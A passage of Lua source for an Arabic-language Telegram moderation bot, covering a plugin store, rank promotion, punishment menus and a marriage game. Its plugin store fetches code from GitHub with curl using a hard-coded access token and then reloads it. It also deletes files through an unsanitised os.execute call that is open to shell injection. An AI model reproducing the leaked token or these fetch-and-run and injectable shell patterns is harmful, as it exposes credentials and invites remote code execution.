local json = JSON.decode(Get_Files)
for v,k in pairs(json.plugins_) do
local CheckFileisFound = io.open("hso_Files/"..v,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
if v == "simsim.lua" then
simsim(msg)
end
if v == "Rdodbot.lua" then
Rdodbot(msg)
end
if v == "name.lua" then
changingname(msg)
end
if v == "username.lua" then
chencherusername(msg)
end
if v == "bing.lua" then
bing(msg)
end
if v == "Gems.lua" then
Gems(msg)
end
end
end
end
end
function key_Callback(ub)
local Get_Files  = io.popen("curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/getfile.json"):read('*a')
local datar = {}
if Get_Files  and Get_Files ~= "404: Not Found" then
local json = JSON.decode(Get_Files)
for v,k in pairs(json.plugins_) do
local CheckFileisFound = io.open("hso_Files/"..v,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
datar[k] = {{text =v,data ="DoOrDel_"..ub.."_"..v},{text ="مفعل",data ="DoOrDel_"..ub.."_"..v}}
else
datar[k] = {{text =v,data ="DoOrDel_"..ub.."_"..v},{text ="معطل",data ="DoOrDel_"..ub.."_"..v}}
end
end
datar[#json.plugins_ +1] = {{text = "‹ مطور السورس ›",url ="https://t.me/OR_33"}}
end
return datar
end
function redis_get(ChatId,tr)
if redis:get(bot_id..":"..ChatId..":settings:"..tr)  then
tf = "✔️" 
else
tf = "❌"   
end    
return tf
end
function Adm_Callback()
if redis:get(bot_id..":Twas") then
Twas = "✅"
else
Twas = "❌"
end
if redis:get(bot_id..":Notice") then
Notice = "✅"
else
Notice = "❌"
end
if redis:get(bot_id..":Departure") then
Departure  = "✅"
else
Departure = "❌"
end
if redis:get(bot_id..":sendbot") then
sendbot  = "✅"
else
sendbot = "❌"
end
if redis:get(bot_id..":infobot") then
infobot  = "✅"
else
infobot = "❌"
end
if redis:get(bot_id..":addu") then
addu  = "✅"
else
addu = "❌"
end
return {
t   = Twas,
n   = Notice,
d   = Departure,
s   = sendbot,
i    = infobot,
addu = addu
}
end
function restrictionGet_Rank(user_id,chat_id)
if redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", user_id) then
var = "BasicConstructor"
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", user_id) then
var = "Constructor"
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", user_id) then
var = "Owner"
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", user_id) then
var = "Administrator"
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", user_id) then
var = "Vips"
else  
var = "mem"
end  
return var
end 
function nfRankrestriction(msg,chat,Rank,Type)
if Creator(msg) then
return false  
end
if redis:get(bot_id..":"..chat..":"..Type..":Rankrestriction:"..Rank) then
return true  
else  
return false  
end
end
function Rankrestriction(chat,Rank,Type)
if redis:get(bot_id..":"..chat..":"..Type..":Rankrestriction:"..Rank) then
infosend  = "❌"
else
infosend = "✅"
end
return infosend
end
function addStatu(Status,user_id,chat_id)
if Status == "programmer" or Status == "developer" then
Statusend =bot_id..":Status:"..Status
else
Statusend = bot_id..":"..chat_id..":Status:"..Status
end
if redis:sismember(Statusend,user_id) then
redis:srem(Statusend,user_id)
else
redis:sadd(Statusend,user_id) 
end
return var
end 
function IsStatu(Status,user_id,chat_id)
if Status == "programmer" or Status == "developer" then
Statusend =bot_id..":Status:"..Status
else
Statusend = bot_id..":"..chat_id..":Status:"..Status
end
if redis:sismember(Statusend,user_id) then
var = '√'
else
var = '×'
end
return var
end 
---------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
function markup(keyboard,inline)
local response = {} 
response.keyboard = keyboard  
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
return JSON.encode(response) 
end
function send(method,database)
local function a(b)
return string.format("%%%02X",string.byte(b))
end
function c(b)
local b=string.gsub(b,"\\","\\")
local b=string.gsub(b,"([^%w])",a)
return b
end
local function d(e)
local f=""
for g,h in pairs(e) do 
if type(h)=='table'then 
for i,j in ipairs(h) do 
f=f..string.format("%s[]=%s&",g,c(j))
end
else f=f..string.format("%s=%s&",g,c(h))
end
end
local f=string.reverse(string.gsub(string.reverse(f),"&","",1))
return f 
end 
if database.reply_to_message_id then
database.reply_to_message_id = (database.reply_to_message_id/2097152/0.5)
end
local url , res = https.request("https://api.telegram.org/bot"..Token.."/"..method.."?"..d(database))
data = json:decode(url)
return data 
end
----------------------------------------------------------------------------------------------------
io.popen("mkdir hso_Files")
print("\27[34m"..[[>> mkdir hso_Files Done]].."\27[m")
----------------------------------------------------------------------------------------------------
function Callback(data)
----------------------------------------------------------------------------------------------------
Text = bot.base64_decode(data.payload.data)
user_id = data.sender_user_id
chat_id = data.chat_id
msg_id = data.message_id
if Text and Text:match("^DoOrDel_(.*)_(.*)") then
local infomsg = {Text:match("^DoOrDel_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
return bot.answerCallbackQuery(data.id, "- الامر لا يخصك", true)
end
local st1 = "- اهلا بك في متجر ملفات السورس ."
local FileName = infomsg[2]
local File_Run = io.open("hso_Files/"..FileName,"r")
if File_Run then
io.close(File_Run)
bot.answerCallbackQuery(data.id,"- تم تعطيل الملف "..FileName.." بنجاح .", true)
os.execute("rm -fr hso_Files/"..FileName)
else
rel = io.popen('curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/Files/'..FileName):read('*a')
if rel  and rel == "404: Not Found" then
return bot.answerCallbackQuery(data.id, "- الملف غير موجود داخل مستودع الملفات .", true)
end
bot.answerCallbackQuery(data.id,"- تم تفعيل الملف "..FileName.." بنجاح .", true)
local GetJson = io.popen('curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/Files/'..FileName):read('*a')
local File = io.open('./hso_Files/'..FileName,"w")
File:write(GetJson)
File:close()
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = key_Callback(data.sender_user_id)
}
st1 = st1.."\n- اضغط على اسم الملف لتفعيله او تعطيله."
bot.editMessageText(chat_id,msg_id,st1, 'md', true, false, reply_markup)
dofile('start.lua')
end
if Text and Text:match("^marriage_(.*)_(.*)_(.*)_(.*)") then
local infomsg = {Text:match("^marriage_(.*)_(.*)_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[2]) then
bot.answerCallbackQuery(data.id,"‹ . انت شعليك . ›",true)
return false
end
if infomsg[4] =="No" then
local UserInfo = bot.getUser(infomsg[1])
local UserInfo1 = bot.getUser(infomsg[2])
if UserInfo.username and UserInfo.username ~= "" then
us1 = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
else
us1 = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
end
if UserInfo1.username and UserInfo1.username ~= "" then
us = '['..UserInfo1.first_name..'](t.me/'..UserInfo1.username..')'
else
us = '['..UserInfo1.first_name..'](tg://user?id='..UserInfo1.id..')'
end
bot.editMessageText(chat_id,msg_id,"*↯︙تم رفض الزواج من* ‹ "..us1.." ›","md",true)  
return bot.sendText(chat_id,infomsg[3],"*↯︙تم رفض الزواج منك من قبل* ‹ "..us.." ›","md",true)  
elseif infomsg[4] =="OK" then
redis:set(bot_id..":"..chat_id..":marriage:"..infomsg[1],infomsg[2]) 
redis:set(bot_id..":"..chat_id..":marriage:"..infomsg[2],infomsg[1]) 
redis:sadd(bot_id..":"..chat_id.."couples",infomsg[1])
redis:sadd(bot_id..":"..chat_id.."wives",infomsg[2])
bot.editMessageText(chat_id,msg_id,"*↯︙تم قبول الزواج من* ‹ "..us.." ›","md",true)  
return bot.sendText(chat_id,infomsg[3],"*↯︙تم قبول الزواج منك من قبل* ‹ "..us1.." ›\n","md",true)  
end
end
----
----
if Text and Text:match("^Punishment_(.*)_(.*)_(.*)") then
local infomsg = {Text:match("^Punishment_(.*)_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "↯︙الامر لا بخصك .", true)
return false
end
if infomsg[3] == "bn" then
local UserInfo = bot.getUser(infomsg[2])
if GetInfoBot(data).BanUser == false then
thetxt = '*↯︙البوت لا يمتلك صلاحيه حظر الاعضاء .* '
end
if not Norank(infomsg[2],chat_id) then
thetxt = "*↯︙لا يمكنك حظر "..Get_Rank(infomsg[2],chat_id).." .*"
else
thetxt = "*↯︙تم حظره بنجاح .*"
tkss = bot.setChatMemberStatus(chat_id,infomsg[2],'banned',0)
redis:sadd(bot_id..":"..chat_id..":Ban",infomsg[2])
if tkss.luatele == "error" then
thetxt = "*↯︙ لا يمكن حظر المستخدم  .*"
end
end
thetxt = Reply_Status(infomsg[2],thetxt).i
elseif infomsg[3] == "unbn" then
thetxt = Reply_Status(infomsg[2],"*↯︙تم الغاء حظره بنجاح .*").i
redis:srem(bot_id..":"..chat_id..":Ban",infomsg[2])
bot.setChatMemberStatus(chat_id,infomsg[2],'restricted',{1,1,1,1,1,1,1,1,1})
elseif infomsg[3] == "kik" then
if GetInfoBot(data).BanUser == false then
thetxt = '*↯︙البوت لا يمتلك صلاحيه طرد الاعضاء .* '
end
if not Norank(infomsg[2],chat_id) then
thetxt = "*↯︙لا يمكنك طرد "..Get_Rank(infomsg[2],chat_id).." .*"
else
thetxt = "*↯︙تم طرده بنجاح .*"
tkss = bot.setChatMemberStatus(chat_id,infomsg[2],'banned',0)
if tkss.luatele == "error" then
thetxt = "*↯︙  لا يمكن طرد المستخدم  .*"
end
end
thetxt = Reply_Status(infomsg[2],thetxt).i
elseif infomsg[3] == "ktm" then
if not Norank(infomsg[2],chat_id) then
thetxt = "*↯︙لا يمكنك كتم "..Get_Rank(infomsg[2],chat_id).." .*"
else
thetxt = "*↯︙تم كتمه بنجاح .*"
redis:sadd(bot_id..":"..chat_id..":silent",infomsg[2])
end
thetxt = Reply_Status(infomsg[2],thetxt).i
elseif infomsg[3] == "unktm" then
thetxt = "*↯︙تم الغاء كتمه بنجاح .*"
redis:srem(bot_id..":"..chat_id..":silent",infomsg[2])
thetxt = Reply_Status(infomsg[2],thetxt).i
elseif infomsg[3] == "ked" then
if GetInfoBot(data).BanUser == false then
thetxt = '*↯︙البوت لا يمتلك صلاحيه تقييد الاعضاء .* '
end
if not Norank(infomsg[2],chat_id) then
thetxt = "*↯︙لا يمكنك تقييد "..Get_Rank(infomsg[2],chat_id).." .*"
else
thetxt = "*↯︙تم تقييده بنجاح .*"
tkss = bot.setChatMemberStatus(chat_id,infomsg[2],'restricted',{1,0,0,0,0,0,0,0,0})
if tkss.luatele == "error" then
thetxt = "*↯︙  لا يمكن تقييد المستخدم  .*"
end
redis:sadd(bot_id..":"..chat_id..":restrict",infomsg[2])
end
thetxt = Reply_Status(infomsg[2],thetxt).i
elseif infomsg[3] == "unked" then
thetxt = "*↯︙تم الغاء تقييده بنجاح .*"
redis:srem(bot_id..":"..chat_id..":restrict",infomsg[2])
thetxt = Reply_Status(infomsg[2],thetxt).i
bot.setChatMemberStatus(chat_id,infomsg[2],'restricted',{1,1,1,1,1,1,1,1,1})
end
bot.editMessageText(chat_id,msg_id,thetxt, 'md', true, false, reply_markup)
end
-----
if Text and Text:match("^infoment_(.*)_(.*)_(.*)") then
local infomsg = {Text:match("^infoment_(.*)_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "- الامر لا بخصك .", true)
return false
end   
if infomsg[3] == "GetRank" then
thetxt = "*↯︙رتبته : *( `"..(Get_Rank(infomsg[2],chat_id)).."` *)*"
elseif infomsg[3] == "message" then
thetxt = "*↯︙عدد رسائله : *( `"..(redis:get(bot_id..":"..chat_id..":"..infomsg[2]..":message") or 1).."` *)*"
elseif infomsg[3] == "Editmessage" then
thetxt = "*↯︙عدد سحكاته : *( `"..(redis:get(bot_id..":"..chat_id..":"..infomsg[2]..":Editmessage") or 0).."` *)*"
elseif infomsg[3] == "game" then
thetxt = "*↯︙عدد نقاطه : *( `"..(redis:get(bot_id..":"..chat_id..":"..infomsg[2]..":game") or 0).."` *)*"
elseif infomsg[3] == "Addedmem" then
thetxt = "*↯︙عدد جهاته : *( `"..(redis:get(bot_id..":"..chat_id..":"..infomsg[2]..":Addedmem") or 0).."` *)*"
elseif infomsg[3] == "addme" then
if bot.getChatMember(chat_id,infomsg[2]).status.luatele == "chatMemberStatusCreator" then
thetxt =  "*↯︙هو منشئ المجموعه. *"
else
addby = redis:get(bot_id..":"..chat_id..":"..infomsg[2]..":AddedMe")
if addby then 
UserInfo = bot.getUser(addby)
Name = '['..UserInfo.first_name..'](tg://user?id='..addby..')'
thetxt = "*↯︙تم اضافته بواسطه  : ( *"..(Name).." *)*"
else
thetxt = "*↯︙قد انضم الى المجموعه عبر الرابط .*"
end
end
end
bot.editMessageText(chat_id,msg_id,thetxt, 'md', true, false, reply_markup)
end
if Text and Text:match("^promotion_(.*)_(.*)_(.*)") then
local infomsg = {Text:match("^promotion_(.*)_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "↯︙الامر لا بخصك .", true)
return false
end   
thetxt = "*↯︙قسم الرفع والتنزيل .\n↯︙العلامه ( √ ) تعني الشخص يمتلك الرتبه .\n↯︙العلامه ( × ) تعني الشخص لا يمتلك الرتبه .*"
addStatu(infomsg[3],infomsg[2],chat_id)
if devB(data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مطور ثانوي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_programmer"},{text =IsStatu("programmer",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_programmer"}},
{{text = "'مطور'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"},{text =IsStatu("developer",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"}},
{{text = "'مالك'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"},{text =IsStatu("Creator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"}},
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":Status:programmer",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مطور'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"},{text =IsStatu("developer",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"}},
{{text = "'مالك'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"},{text =IsStatu("Creator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"}},
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":Status:developer",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مالك'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"},{text =IsStatu("Creator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"}},
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
end
bot.editMessageText(chat_id,msg_id,thetxt, 'md', true, false, reply_markup)
end
if Text and Text:match("^"..data.sender_user_id.."_(.*)bkthk") then
local infomsg = {Text:match("^"..data.sender_user_id.."_(.*)bkthk")}
thetxt = "*↯︙اختر الامر المناسب*"
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text ="قائمه 'الرفع و التنزيل'",data="control_"..data.sender_user_id.."_"..infomsg[1].."_1"}},
{{text ="قائمه 'العقوبات'",data="control_"..data.sender_user_id.."_"..infomsg[1].."_2"}},
{{text = "كشف 'المعلومات'" ,data="control_"..data.sender_user_id.."_"..infomsg[1].."_3"}},
}
}
bot.editMessageText(chat_id,msg_id,thetxt, 'md', true, false, reply_markup)
end
if Text and Text:match("^control_(.*)_(.*)_(.*)") then
local infomsg = {Text:match("^control_(.*)_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "↯︙الامر لا بخصك .", true)
return false
end   
if tonumber(infomsg[3]) == 1 then
thetxt = "*↯︙قسم الرفع والتنزيل . \n↯︙العلامه ( √ ) تعني الشخص يمتلك الرتبه .\n↯︙العلامه ( × ) تعني الشخص لا يمتلك الرتبه .*"
if devB(data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مطور ثانوي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_programmer"},{text =IsStatu("programmer",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_programmer"}},
{{text = "'مطور'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"},{text =IsStatu("developer",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"}},
{{text = "'مالك'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"},{text =IsStatu("Creator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"}},
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":Status:programmer",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مطور'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"},{text =IsStatu("developer",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_developer"}},
{{text = "'مالك'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"},{text =IsStatu("Creator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"}},
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":Status:developer",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مالك'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"},{text =IsStatu("Creator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Creator"}},
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
